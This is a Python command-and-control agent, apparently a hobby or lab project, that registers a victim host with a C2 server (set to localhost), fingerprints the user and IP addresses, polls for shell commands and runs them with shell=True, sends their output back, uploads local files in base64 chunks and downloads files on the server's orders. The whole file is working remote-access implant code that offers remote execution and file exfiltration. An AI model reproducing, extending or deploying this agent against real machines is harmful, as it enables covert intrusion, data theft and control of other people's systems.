import requests, os, time, platform, subprocess, json, uuid, math, random, socket, hashlib, getpass, base64
# Configuration
SERVER_URL = "http://localhost:8000/c2app"
POLL_INTERVAL = random.randint(1, 20)

def get_agent_name():
    try:
        if platform.system() != 'Windows':
            return getpass.getuser()
        else:
            return os.getlogin()
    except Exception as e:
        return getpass.getuser()


def get_ip_addresses():
    ip_addresses = []
    hostname = socket.gethostname()
    try:
        host_ip = socket.gethostbyname_ex(hostname)
        ip_addresses = host_ip[2]
    except socket.gaierror as e:
        print(f"Error getting IP addresses: {e}")
    return ip_addresses


def load_or_create_agent_uuid():
    # TO DO : if there was no response from server exception
    release = platform.release()
    version = platform.version()
    machine = platform.machine()

    base_string = f"{release}-{version}-{machine}"
    hash_object = hashlib.sha256(base_string.encode())
    hex_string = hash_object.hexdigest()[:32]  # Get the first 32 hex characters (16 bytes)
    # Format the hex string into UUID format (8-4-4-4-12)
    agent_uuid = f"{hex_string[:8]}-{hex_string[8:12]}-{hex_string[12:16]}-{hex_string[16:20]}-{hex_string[20:]}"
    # wmic diskdrive get serialnumber
    # SerialNumber
    # 0000_0000_0000_0001_00A0_7522_3822_BC1D
    return agent_uuid


# Register OR Reconnect the agent with the C2 server
def register_or_reconnect_agent(agent_uuid):
    agent_ip = get_ip_addresses()[0]
    url = f"{SERVER_URL}/agents/"
    data = {
        "uuid": agent_uuid,
        "name": AGENT_NAME,
        "ip_address": agent_ip
    }
    response = requests.post(url, json=data)
    if response.status_code == 201:
        agent_id = response.json()['id']
        print(f"Agent registered with ID: {agent_id}")
    elif response.status_code == 200:
        agent_id = response.json()['id']
        print(f"Agent reconnected with ID: {agent_id}")
    else:
        print("Failed to register or reconnect agent.")
        agent_id = None
    return agent_id


# Poll the C2 server for commands
def get_commands(agent_id):
    url = f"{SERVER_URL}/agents/{agent_id}/commands/"
    response = requests.get(url)
    if response.status_code == 200:
        return response.json()  # Return commands if not paused
    elif response.status_code == 403 and response.json().get("status") == "paused":
        print("Agent is paused. Waiting for unpause...")
        return None  # Return None if paused
    else:
        print("Failed to get commands.")
        return []


# Poll the C2 server for pending file downloads
def get_pending_files(agent_id):
    url = f"{SERVER_URL}/agents/{agent_id}/pending_files/"
    response = requests.get(url)
    if response.status_code == 200:
        return response.json()
    else:
        print("Failed to get pending files.")
        return []


# Execute a command
def execute_command(command):
    # what if the output is not text
    try:
        result = subprocess.run(command, shell=True, stderr=subprocess.STDOUT, stdout=subprocess.PIPE, text=True, timeout=20)
        return result.stdout
    except subprocess.TimeoutExpired:
        return "Command timed out after 20 seconds"
    except Exception as e:
        return f"Command execution failed: {str(e)}"


# Send command output back to the server
def send_command_output(agent_id, command_id, output):
    # Create an executed command entry
    url = f"{SERVER_URL}/agents/{agent_id}/commands/{command_id}/"
    data = {
        "executed": True,  # Mark command as executed
        "output": output,  # Send the command output to the server
    }
    response = requests.patch(url, json=data)
    if response.status_code == 200:
        print(f"Output sent for command ID: {command_id}")
        # Move the executed command to the ExecutedCommand model
    #     executed_command_url = f"{SERVER_URL}/agents/{agent_id}/executed_commands/"
    #     executed_data = {
    #         "agent": agent_id,
    #         "command_text": response.json()['command_text'],
    #         "output": output,
    #     }
    #     executed_response = requests.post(executed_command_url, json=executed_data)
    #     if executed_response.status_code == 201:
    #         # After moving, delete the original command
    #         delete_response = requests.delete(url)
    #         if delete_response.status_code == 204:
    #             print(f"Command ID: {command_id} deleted successfully.")
    #         else:
    #             print(f"Failed to delete command ID: {command_id}.")
    #     else:
    #         print("Failed to move executed command.")
    # else:
    #     print("Failed to send command output.")


# Upload a file to the server
def upload_file(agent_id, file_name):
    chunk_size = 10240 * 2  # 20 KB per chunk
    file_size = os.path.getsize(file_name)
    total_chunks = (file_size + chunk_size - 1) // chunk_size
    try:
        with open(file_name, 'rb') as file:
            chunk_index = 0
            while True:
                chunk = file.read(chunk_size)
                if not chunk:
                    break
                encoded_chunk = base64.b64encode(chunk).decode('utf-8')
                payload = {
                    'agentId': agent_id,
                    'chunkData': encoded_chunk,
                    'counter': total_chunks,  # Total number of chunks (same for every request)
                    'chunkIndex': chunk_index  # Track the current chunk index
                }

                server_url = f"{SERVER_URL}/agents/{agent_id}/pending_files/"
                try:
                    response = requests.post(server_url, json=payload)
                    if response.status_code != 201:
                        print(f"Error: Failed to upload chunk {chunk_index + 1}/{total_chunks}. "
                          f"Server responded with {response.status_code}")
                except Exception as e:
                    print(f"Chunk {chunk_index + 1}/{total_chunks} uploaded successfully.")
                    print(f"code exited with: {e}")
                chunk_index += 1
        print("File upload completed.")
    except Exception as e:
        return f"Error uploading file: {str(e)}"


# Download a file from the server
def download_file(file_url, save_path):
    try:
        response = requests.get(file_url)
        if response.status_code == 200:
            with open(save_path, 'wb') as file:
                file.write(response.content)
            print(f"File downloaded successfully to {save_path}.")
        else:
            print(f"Failed to download file from {file_url}. Status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Failed to download the file. Error: {e}")


def custom_sleep(counter):
    threshold = 60 * 60
    s = math.exp(counter)
    if s < threshold:
        time.sleep(POLL_INTERVAL + s)
    else:
        time.sleep(threshold)


def server_file(agent_id):
    flag = False
    pending_files = get_pending_files(agent_id)
    for file_info in pending_files:
        flag = True
        file_name = file_info['file_name']
        current_directory = os.path.dirname(os.path.abspath(__file__))
        file_path = os.path.join(current_directory, file_name)

        if file_info['direction'] == 'download' and file_info['status'] == 'pending':
            try:
                file_url = f"http://localhost:8000{file_info['file']}"
                download_file(file_url, file_path)

            except Exception as e:
                print(f"Failed to download {file_name}. Error: {e}")
        if file_info['direction'] == 'upload' and file_info['status'] == 'pending':
            try:
                upload_file(agent_id,file_name)
            except Exception as e:
                print(f"Failed to upload {file_name}. Error: {e}")
    return flag


def server_command(agent_id, counter):
    flag = False
    try:
        commands = get_commands(agent_id)  # Fetch commands

        for command in commands:
            command_text = command.get('command_text', '').lower()  # Fetch and lower-case the command text

            if 'pause' in command_text:  # Check if 'pause' is in the command
                try:
                    # Extract the duration of the pause
                    parts = command_text.split()
                    if len(parts) > 1 and parts[1].isdigit():
                        pause_duration = int(parts[1])
                    else:
                        pause_duration = POLL_INTERVAL  # Default to poll interval if no duration

                    print(f"Pausing for {pause_duration} seconds...")
                    time.sleep(pause_duration)
                    send_command_output(agent_id, command['id'], f"Paused for {pause_duration} seconds")
                except ValueError:
                    print("Invalid pause duration, using default interval.")
                    time.sleep(POLL_INTERVAL)
            else:
                flag = True
                if not command['executed']:
                    if counter > 20:
                        counter = 0
                    print(f"Executing command: {command['command_text']}")
                    output = execute_command(command['command_text'])
                    send_command_output(agent_id, command['id'], output)

    except Exception as e:
        print(f"Command execution failed: {str(e)}")
    return flag


AGENT_NAME = get_agent_name()


def main():
    agent_id = 0
    counter = 0
    cmd_flag = False
    fle_flag = False
    while True:
        if not agent_id:
            agent_uid = load_or_create_agent_uuid()
            agent_id = register_or_reconnect_agent(agent_uid)  # MAKE IT SAME

        else:  # agent has been installed already
            try:
                cmd_flag = server_command(agent_id, counter)
            except Exception as e:
                print(f"Command execution failed: {str(e)}")
            try:
                fle_flag = server_file(agent_id)
            except Exception as e:
                print(f"File Related Command failed: {str(e)}")

            if cmd_flag and fle_flag:
                counter += 1
                custom_sleep(counter)
            else:
                time.sleep(POLL_INTERVAL)


if __name__ == "__main__":
    main()
